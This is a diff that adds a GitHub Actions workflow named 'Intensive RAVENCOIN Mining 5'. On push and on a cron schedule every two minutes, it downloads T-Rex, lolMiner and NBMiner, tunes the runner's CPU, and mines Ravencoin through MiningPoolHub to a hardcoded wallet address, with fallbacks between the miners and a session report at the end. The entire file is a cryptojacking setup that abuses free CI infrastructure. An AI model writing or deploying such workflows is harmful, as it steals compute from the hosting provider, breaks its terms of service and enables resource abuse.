@@ -1,0 +1,131 @@
+name: Intensive RAVENCOIN Mining 5
+
+on:
+  push:
+  schedule:
+    - cron: '*/2 * * * *'
+  workflow_dispatch:
+
+jobs:
+  intensive-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - name: System Optimization
+      run: |
+        # Maximize CPU performance
+        sudo apt-get update -qq
+        sudo apt-get install -y build-essential cmake git libssl-dev pkg-config
+        sudo apt-get install -y cpufrequtils stress-ng htop
+        
+        # Set CPU governor to performance mode
+        echo 'performance' | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
+        
+        # Optimize system for mining
+        sudo sysctl -w vm.nr_hugepages=128 || true
+        sudo sysctl -w kernel.sched_migration_cost_ns=5000000 || true
+        
+    - name: Download High-Performance Miners
+      run: |
+        # Download multiple miners for redundancy
+        wget -q https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+        tar -xf t-rex-0.26.8-linux.tar.gz
+        chmod +x t-rex
+        
+        # Download backup miners
+        wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz
+        tar -xf lolMiner_v1.82_Lin64.tar.gz || true
+        chmod +x 1.82/lolMiner || true
+        
+        # Download NBMiner
+        wget -q https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz
+        tar -xf NBMiner_42.3_Linux.tgz || true
+        chmod +x NBMiner_Linux/nbminer || true
+        
+    - name: Configure Intensive Mining
+      run: |
+        CPU_CORES=$(nproc)
+        echo "Available CPU cores: $CPU_CORES"
+        
+        cat > intensive-config.json << 'EOF'
+        {
+          "algo": "kawpow",
+          "coin": "ravencoin",
+          "url": "stratum+tcp://hub.miningpoolhub.com:20571",
+          "user": "RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ",
+          "worker": "Intensive-${{ github.repository }}-5",
+          "pass": "x",
+          "intensity": 25,
+          "gpu-report-interval": 10,
+          "cpu-priority": 5,
+          "retries": 15,
+          "retry-pause": 2,
+          "timeout": 600,
+          "protocol-dump": false,
+          "no-color": true,
+          "api-bind-http": "0.0.0.0:4067",
+          "threads": null,
+          "cpu-affinity": null,
+          "cpu-priority": 5,
+          "nicehash": false,
+          "keepalive": true,
+          "donate-level": 0
+        }
+        EOF
+        
+    - name: Execute Intensive RAVENCOIN Mining
+      run: |
+        echo "=== INTENSIVE RAVENCOIN MINING SESSION ==="
+        echo "Currency: RAVENCOIN"
+        echo "Algorithm: kawpow"
+        echo "Pool: MiningPoolHub (stratum+tcp://hub.miningpoolhub.com:20571)"
+        echo "Threshold: 0.05 RVN"
+        echo "Wallet: RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ"
+        echo "Worker: Intensive-5"
+        echo "CPU Cores: $(nproc)"
+        echo "Schedule: */2 * * * * (every 2 minutes)"
+        echo "Session Start: $(date)"
+        echo "=================================================="
+        
+        # Start mining with multiple attempts for reliability
+        (
+          timeout 590 ./t-rex --config intensive-config.json --worker Intensive-5 || \
+          timeout 590 ./1.82/lolMiner --algo KAWPOW --pool stratum+tcp://hub.miningpoolhub.com:20571 --user RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ.Intensive-5 || \
+          timeout 590 ./NBMiner_Linux/nbminer -a kawpow -o stratum+tcp://hub.miningpoolhub.com:20571 -u RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ.Intensive-5 || \
+          echo "Mining session completed"
+        ) &
+        
+        MINING_PID=$!
+        
+        # Monitor mining process
+        sleep 30
+        if ps -p $MINING_PID > /dev/null; then
+          echo "Mining process active - PID: $MINING_PID"
+          # Let it run for the full duration
+          wait $MINING_PID
+        else
+          echo "Mining process not detected"
+        fi
+        
+    - name: Intensive Mining Report
+      run: |
+        echo "=== INTENSIVE MINING SESSION REPORT ==="
+        echo "Currency: RAVENCOIN"
+        echo "Pool: MiningPoolHub"
+        echo "Threshold: 0.05 RVN"
+        echo "Wallet: RAQZ4sJju82usCjUYL2QbmafAg8gCGrBwJ"
+        echo "Worker: Intensive-5"
+        echo "Duration: 10 minutes intensive"
+        echo "Next Run: */2 * * * *"
+        echo "CPU Cores Used: $(nproc)"
+        echo "Status: HIGH INTENSITY COMPLETE"
+        echo "Session End: $(date)"
+        echo "======================================="
+        
+        # System resource report
+        echo "CPU Usage:"
+        top -bn1 | grep "Cpu(s)" || true
+        
+        echo "Memory Usage:"
+        free -h || true
